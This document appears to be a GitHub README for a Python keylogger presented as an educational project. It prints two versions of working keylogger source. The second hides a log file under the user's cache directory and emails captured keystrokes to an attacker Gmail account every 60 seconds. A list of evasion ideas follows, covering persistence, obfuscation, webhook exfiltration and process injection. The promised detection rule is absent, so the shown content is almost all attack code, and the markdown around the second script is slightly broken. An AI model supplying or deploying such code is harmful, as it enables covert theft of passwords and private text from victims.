# 🕵️‍♂️ Python Keylogger Simulation — Educational Project

![Python](https://img.shields.io/badge/Made%20with-Python-blue)
![Status](https://img.shields.io/badge/Status-Development-orange)
![License](https://img.shields.io/badge/License-Educational%20Use-green)

---

## 🎯 About This Project

This repository demonstrates how **keylogging techniques work** from an attacker's perspective and more importantly, how defenders can detect and mitigate them.

**⚠️ For Educational & Ethical Research Purposes Only!**  
This project was created to **learn, simulate, and defend** — NOT for illegal usage.

---

## 🚀 Project Structure

| Version | Description |
|:-:|:-|
| **v1** | Basic keylogger — captures keystrokes and stores them locally in a `.txt` file |
| **v2** | Enhanced keylogger — captures keystrokes & exfiltrates logs to an email account + saves hidden backup log |
| **v3** | 🚧 Coming soon — YARA Detection Rule & Dynamic Anti-Keylogger Monitor |

---

## 📄 Code & Explanation

### 🎯 Version 1 — Basic Keylogger

```python
from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            log.write(f" [{key}] ")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
```

<p align="justify"> <b>📝 Explanation:</b><br> This is a very basic Python keylogger that captures every keystroke entered by the user. It uses the <code>pynput</code> library to listen to keyboard events and stores the logs in a local file named <code>keylog.txt</code>. Special keys like Enter, Space, or Ctrl are stored in <code>[KEY]</code> format. </p>

import pynput.keyboard
import threading
import smtplib
import os

log = ""
log_dir = os.path.expanduser("~/.cache")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, ".syslog_hidden")

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f" [{key}] "

def send_mail():
    global log
    if log:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login("attackerEmail@gmail.com", "attackerPassword")
            server.sendmail("attackerEmail@gmail.com", "attackerEmail@gmail.com", log)
            server.quit()
        except:
            pass
        with open(log_file, "a") as f:
            f.write(log + "\n")
        log = ""
    
    timer = threading.Timer(60, send_mail)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
keyboard_listener.start()
send_mail()
keyboard_listener.join()
```

<p align="justify"> <b>📝 Explanation:</b><br> This enhanced version of the keylogger not only captures every keystroke but also sends the recorded logs to an attacker's Gmail account every 60 seconds using the <code>smtplib</code> module. Additionally, it saves a backup copy of the logs in a hidden file <code>.syslog_hidden</code> under the user's <code>.cache</code> directory. The script uses multithreading to send logs without interrupting the keylogging process. </p>

💡 Advanced Possibilities (Future Work)
In real-world scenarios, attackers may extend this project to:

🔸 Add persistence mechanisms (Startup Folder, Registry)

🔸 Use Base64 obfuscation or packing to avoid detection

🔸 Exfiltrate logs via Telegram, Discord, Webhooks

🔸 Perform process injection

🔸 Evade antivirus detection using stealth techniques

In this project, I will soon publish: ✅ YARA Detection Rule
✅ Real-time Anti-Keylogger Dynamic Defense Script


☕️ Support My Cybersecurity Learning Journey
<p align="center"> <a href="https://buymeacoffee.com/sudersen" target="_blank"> <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" height="50" width="210" alt="Buy Me A Coffee" /> </a> </p>

⚠️ Disclaimer
This project is strictly for educational, research, and ethical hacking learning purposes only.
Unauthorized use, distribution, or misuse of this code for malicious intent is illegal and unethical.
Always test this project in your own controlled lab environments.

📩 Feedback & Collaboration
If you're interested in collaborating, learning, or enhancing detection techniques — feel free to connect:

🔗 LinkedIn: www.linkedin.com/in/drsudersen
☕️ Buy Me a Coffee :  https://buymeacoffee.com/sudersen
